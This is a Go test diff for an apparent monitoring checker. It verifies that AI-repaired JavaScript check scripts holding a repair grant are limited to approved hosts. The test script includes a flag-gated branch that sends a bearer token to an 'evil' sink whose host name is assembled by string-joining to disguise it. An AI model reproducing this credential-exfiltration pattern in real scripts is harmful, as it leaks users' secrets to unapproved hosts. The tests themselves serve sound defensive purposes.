@@ -129,34 +129,54 @@ func TestRepairGrantLetsTheGrantedHostThrough(t *testing.T) {
 	r.True(acme.sawSecret())
 }
 
-// A run without secret values, or a config without a grant (a human-written
-// script, or one whose edit dropped the grant), is not held.
-func TestRepairGrantOnlyHoldsItsScriptWithSecrets(t *testing.T) {
+// A granted config is held even with no `secrets` value: its env may carry
+// a resolved `${param:…}` reference (spec 2026-10-26-02). The branch to the
+// evilco sink is refused and the sink gets nothing.
+func TestRepairGrantHoldsAScriptWithoutSecrets(t *testing.T) {
 	t.Parallel()
 
-	for _, name := range []string{"no grant", "no secrets"} {
-		t.Run(name, func(t *testing.T) {
-			t.Parallel()
+	r := require.New(t)
+	acme, evil := newSecretSink(t), newSecretSink(t)
+	script := `var auth = { headers: { Authorization: "Bearer " + env.TOKEN } };
+var r = http.get("http://127.0.0.1:` + acme.port + `/", auth);
+if (env.FIRE === "yes") { http.get("http://" + ["local", "host"].join("") + ":` + evil.port + `/", auth); }
+return { status: r.error ? "down" : "up", output: { e: r.error } };`
+	cfg := repairedConfig(script, []string{"127.0.0.1"})
+	// The env as materializeConfig hands it over: the `${param:token}` the
+	// grant was issued for, resolved to its value.
+	cfg.AI.RepairGrant = checkconfig.RepairDigest(script, map[string]string{"FIRE": "yes", "TOKEN": "${param:token}"})
+	cfg.Env = map[string]string{"FIRE": "yes", "TOKEN": repairTestSecret}
+	cfg.Secrets = map[string]string{"TOKEN": ""}
 
-			r := require.New(t)
-			acme, evil := newSecretSink(t), newSecretSink(t)
-			cfg := repairedConfig(acmeScript(acme.port, `"http://localhost:`+evil.port+`"`), []string{"127.0.0.1"})
+	stored := cfg.GetConfig()
+	stored["env"] = map[string]any{"FIRE": "yes", "TOKEN": "${param:token}"}
 
-			if name == "no grant" {
-				cfg.AI.RepairGrant, cfg.AI.RepairHosts = "", nil
-			} else {
-				cfg.Secrets = map[string]string{"TOKEN": ""}
-			}
+	result, err := (&JSChecker{}).Execute(WithStoredRepairHold(context.Background(), stored), cfg)
+	r.NoError(err)
+	r.Equal(checkerdef.StatusError, result.Status, result.Output)
+	r.Equal(true, result.Output[OutputKeyRepairRefused])
+	r.Zero(evil.hits(), "the refused host received nothing")
+	r.True(acme.sawSecret(), "positive control: the granted host was reached")
+}
 
-			_, held := cfg.RepairAllowlist()
-			r.Equal(name == "no secrets", held)
+// A config without a grant (a human-written script, or one whose edit
+// dropped the grant) is not held: the same branch reaches its host.
+func TestRepairGrantOnlyHoldsAGrantedScript(t *testing.T) {
+	t.Parallel()
 
-			result, err := (&JSChecker{}).Execute(context.Background(), cfg)
-			r.NoError(err)
-			r.Equal(checkerdef.StatusUp, result.Status, result.Output)
-			r.Equal(1, evil.hits(), "the new host is reachable")
-		})
-	}
+	r := require.New(t)
+	acme, evil := newSecretSink(t), newSecretSink(t)
+	cfg := repairedConfig(acmeScript(acme.port, `"http://localhost:`+evil.port+`"`), []string{"127.0.0.1"})
+	cfg.AI.RepairGrant, cfg.AI.RepairHosts = "", nil
+	cfg.Secrets = map[string]string{"TOKEN": ""}
+
+	_, held := cfg.RepairAllowlist()
+	r.False(held)
+
+	result, err := (&JSChecker{}).Execute(context.Background(), cfg)
+	r.NoError(err)
+	r.Equal(checkerdef.StatusUp, result.Status, result.Output)
+	r.Equal(1, evil.hits(), "the new host is reachable")
 }
 
 // A grant left on a script it was not issued for (a write path that skipped
